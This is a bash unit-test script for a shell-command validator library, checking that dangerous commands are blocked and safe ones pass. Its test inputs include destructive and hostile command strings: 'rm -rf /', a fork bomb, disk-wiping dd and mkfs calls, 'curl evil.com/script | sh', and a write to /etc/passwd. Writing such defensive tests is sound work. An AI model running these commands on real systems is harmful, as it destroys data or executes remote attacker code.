#!/usr/bin/env bash
#
# test_validator.sh - Unit tests for validator functions
#
# Tests all functions in lib/validator.sh

# Don't use strict mode to allow tests to continue
set +e

# Test setup
SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
PROJECT_ROOT="$(cd "$SCRIPT_DIR/../.." && pwd)"

# Minimal log function
log() { :; }

# Source the library
source "$PROJECT_ROOT/lib/validator.sh"

# Color codes
GREEN='\033[0;32m'
RED='\033[0;31m'
NC='\033[0m'

echo "Running Validator Unit Tests"
echo "============================"
echo

TESTS_PASSED=0
TESTS_FAILED=0

# Test helper function
run_test() {
    local test_name="$1"
    local result="$2"
    local expected="$3"
    
    echo -n "Testing $test_name... "
    
    if [[ "$result" == "$expected" ]]; then
        echo -e "${GREEN}PASS${NC}"
        ((TESTS_PASSED++))
    else
        echo -e "${RED}FAIL${NC}"
        echo "  Expected: '$expected'"
        echo "  Got: '$result'"
        ((TESTS_FAILED++))
    fi
}

# Test validate_command function
echo "=== Testing validate_command ==="

# Test 1: Valid command
validate_command "ls -la" "false" && result="valid" || result="invalid"
run_test "valid command" "$result" "valid"

# Test 2: Empty command
validate_command "" "false" && result="valid" || result="invalid"
run_test "empty command" "$result" "invalid"

# Test 3: Dangerous command - rm -rf /
validate_command "rm -rf /" "false" && result="valid" || result="invalid"
run_test "rm -rf / blocked" "$result" "invalid"

# Test 4: Fork bomb
validate_command ":(){:|:&};:" "false" && result="valid" || result="invalid"
run_test "fork bomb blocked" "$result" "invalid"

# Test 5: Command too long
long_cmd=$(printf 'a%.0s' {1..1100})
validate_command "$long_cmd" "false" && result="valid" || result="invalid"
run_test "command too long" "$result" "invalid"

# Test 6: Safe mode - write operation
validate_command "touch newfile" "true" && result="valid" || result="invalid"
run_test "safe mode blocks write" "$result" "invalid"

# Test 7: Safe mode - read operation
validate_command "cat file.txt" "true" && result="valid" || result="invalid"
run_test "safe mode allows read" "$result" "valid"

echo
echo "=== Testing check_dangerous_commands ==="

# Test 1: Safe command
check_dangerous_commands "ls -la" "false" && result="safe" || result="dangerous"
run_test "safe command check" "$result" "safe"

# Test 2: dd command
check_dangerous_commands "dd if=/dev/zero of=/dev/sda" "false" && result="safe" || result="dangerous"
run_test "dd command blocked" "$result" "dangerous"

# Test 3: mkfs command
check_dangerous_commands "mkfs.ext4 /dev/sdb1" "false" && result="safe" || result="dangerous"
run_test "mkfs blocked" "$result" "dangerous"

# Test 4: Curl pipe to shell
check_dangerous_commands "curl evil.com/script | sh" "false" && result="safe" || result="dangerous"
run_test "curl pipe to shell blocked" "$result" "dangerous"

# Test 5: Safe mode - sudo
check_dangerous_commands "sudo ls" "true" && result="safe" || result="dangerous"
run_test "sudo blocked in safe mode" "$result" "dangerous"

echo
echo "=== Testing check_dangerous_patterns ==="

# Test 1: No dangerous patterns
check_dangerous_patterns "ls -la" && result="safe" || result="dangerous"
run_test "no dangerous patterns" "$result" "safe"

# Test 2: Command chaining with semicolon
check_dangerous_patterns "ls; rm file" && result="safe" || result="dangerous"
run_test "semicolon chaining" "$result" "dangerous"

# Test 3: Background execution
check_dangerous_patterns "sleep 100 &" && result="safe" || result="dangerous"
run_test "background execution" "$result" "dangerous"

# Test 4: Command substitution
check_dangerous_patterns 'echo $(whoami)' && result="safe" || result="dangerous"
run_test "command substitution" "$result" "dangerous"

# Test 5: Safe chaining pattern
check_dangerous_patterns "test -f file && echo exists" && result="safe" || result="dangerous"
run_test "safe chaining allowed" "$result" "safe"

echo
echo "=== Testing is_safe_chaining ==="

# Test 1: Safe echo chaining
is_safe_chaining "command && echo done" && result="safe" || result="unsafe"
run_test "safe echo chaining" "$result" "safe"

# Test 2: Test command chaining
is_safe_chaining "test -f file && cat file" && result="safe" || result="unsafe"
run_test "test command chaining" "$result" "safe"

# Test 3: Unsafe chaining
is_safe_chaining "ls && rm -rf /" && result="safe" || result="unsafe"
run_test "unsafe chaining" "$result" "unsafe"

echo
echo "=== Testing check_suspicious_constructs ==="

# Test 1: Normal command
check_suspicious_constructs "ls -la" && result="ok" || result="suspicious"
run_test "normal command" "$result" "ok"

# Test 2: System path modification
check_suspicious_constructs "echo test > /etc/passwd" && result="ok" || result="suspicious"
run_test "system path modification" "$result" "suspicious"

# Test 3: Environment variable
check_suspicious_constructs "export EDITOR=vim" && result="ok" || result="suspicious"
run_test "safe env var" "$result" "ok"

# Test 4: Dangerous env var
check_suspicious_constructs "export PATH=/evil/path" && result="ok" || result="suspicious"
run_test "dangerous env var" "$result" "suspicious"

# Test 5: Alias definition
check_suspicious_constructs "alias rm='rm -i'" && result="ok" || result="suspicious"
run_test "alias definition" "$result" "suspicious"

echo
echo "=== Testing is_safe_env_var ==="

# Test 1: Safe EDITOR var
is_safe_env_var "export EDITOR=nano" && result="safe" || result="unsafe"
run_test "EDITOR env var" "$result" "safe"

# Test 2: Unsafe PATH var
is_safe_env_var "export PATH=/tmp" && result="safe" || result="unsafe"
run_test "PATH env var" "$result" "unsafe"

# Test 3: Safe PAGER var
is_safe_env_var "export PAGER=less" && result="safe" || result="unsafe"
run_test "PAGER env var" "$result" "safe"

echo
echo "=== Testing validate_command_structure ==="

# Test 1: Valid structure
validate_command_structure "ls -la /home" && result="valid" || result="invalid"
run_test "valid structure" "$result" "valid"

# Test 2: Invalid first word
validate_command_structure "!@# file" && result="valid" || result="invalid"
run_test "invalid first word" "$result" "invalid"

# Test 3: Unbalanced single quotes
validate_command_structure "echo 'hello" && result="valid" || result="invalid"
run_test "unbalanced single quotes" "$result" "invalid"

# Test 4: Unbalanced double quotes
validate_command_structure 'echo "hello' && result="valid" || result="invalid"
run_test "unbalanced double quotes" "$result" "invalid"

# Test 5: Unbalanced parentheses
validate_command_structure "echo (test" && result="valid" || result="invalid"
run_test "unbalanced parentheses" "$result" "invalid"

# Test 6: Balanced quotes and parens
validate_command_structure 'echo "test (hello)"' && result="valid" || result="invalid"
run_test "balanced quotes and parens" "$result" "valid"

echo
echo "=== Testing validate_safe_mode ==="

# Test 1: Allowed command in safe mode
validate_safe_mode "grep pattern file" && result="allowed" || result="blocked"
run_test "grep allowed in safe mode" "$result" "allowed"

# Test 2: Disallowed command in safe mode
validate_safe_mode "vim file.txt" && result="allowed" || result="blocked"
run_test "vim blocked in safe mode" "$result" "blocked"

# Test 3: Output redirection in safe mode
validate_safe_mode "ls > output.txt" && result="allowed" || result="blocked"
run_test "output redirection blocked" "$result" "blocked"

# Test 4: Pipe in safe mode
validate_safe_mode "ls | grep txt" && result="allowed" || result="blocked"
run_test "pipe blocked in safe mode" "$result" "blocked"

echo
echo "=== Testing get_command_risk_level ==="

# Test 1: High risk command
result=$(get_command_risk_level "rm -rf directory")
run_test "rm command risk level" "$result" "HIGH"

# Test 2: Medium risk command
result=$(get_command_risk_level "mv file1 file2")
run_test "mv command risk level" "$result" "MEDIUM"

# Test 3: Low risk command
result=$(get_command_risk_level "ls -la")
run_test "ls command risk level" "$result" "LOW"

# Test 4: chmod high risk
result=$(get_command_risk_level "chmod 777 file")
run_test "chmod risk level" "$result" "HIGH"

echo
echo "=== Testing generate_safety_warning ==="

# Test 1: High risk warning
result=$(generate_safety_warning "rm -rf /tmp/test")
[[ "$result" == *"WARNING"* ]] && test_result="has warning" || test_result="no warning"
run_test "high risk warning" "$test_result" "has warning"

# Test 2: Medium risk warning
result=$(generate_safety_warning "mkdir newdir")
[[ "$result" == *"CAUTION"* ]] && test_result="has caution" || test_result="no caution"
run_test "medium risk caution" "$test_result" "has caution"

# Test 3: Low risk info
result=$(generate_safety_warning "pwd")
[[ "$result" == *"safe"* ]] && test_result="marked safe" || test_result="not marked safe"
run_test "low risk info" "$test_result" "marked safe"

echo
echo "Summary: $TESTS_PASSED passed, $TESTS_FAILED failed"

if [[ $TESTS_FAILED -eq 0 ]]; then
    exit 0
else
    exit 1
fi